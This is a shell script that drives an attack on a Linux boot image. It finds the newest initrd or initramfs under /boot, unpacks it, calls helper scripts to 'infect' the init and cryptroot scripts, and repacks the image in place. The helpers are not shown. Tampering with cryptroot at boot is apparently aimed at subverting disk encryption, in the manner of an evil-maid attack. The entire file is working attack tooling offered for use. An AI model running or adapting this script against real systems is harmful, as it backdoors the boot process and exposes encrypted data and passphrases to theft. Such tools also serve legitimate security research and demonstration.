#!/bin/sh

. ./infect_functions.sh

if [ $# -ge 1 ]; then
    fs_location=$1
fi

echo "Using filesystem location: $fs_location/ [blank is /]"

# Find initrd file
images="`find $fs_location/boot -name 'initramfs*.img*' -o -name 'initrd*.img*'`"
if [ -z "$images" ]; then
    echo "No initrd/initramfs image found, exiting."
    exit 1
fi

initrd=`ls -t $images | head -n1`
initrd=`readlink -f $initrd`

echo "Initrd image found: $initrd"

ird_extracted="/tmp/img-initrd"

if ! file $initrd | grep gzip; then
    echo "unsupported initrd format or permission error, sorry."
    exit 1
fi


./unpack.sh $initrd $ird_extracted

# find the init script
init=`find_file_by_type init shell $ird_extracted`
if [ -z "$init" ]; then
    echo "unsupported init file format in initrd, sorry."
    echo "file said: `file $init`"
    exit 1
fi
echo -n "Infecting init ($init)... "
./infect_init.sh $init
echo "Done."

cryptroot=`find_file_by_type cryptroot shell $ird_extracted`
if [ -z "$cryptroot" ]; then
    echo "unsupported cryptroot file format in initrd, sorry."
    echo "file said: `file $cryptroot`"
    exit 1
fi
echo -n "Infecting cryptroot ($cryptroot)... "
./infect_cryptroot.sh $cryptroot
echo "Done."

./repack.sh $ird_extracted $initrd
rm -rf $ird_extracted
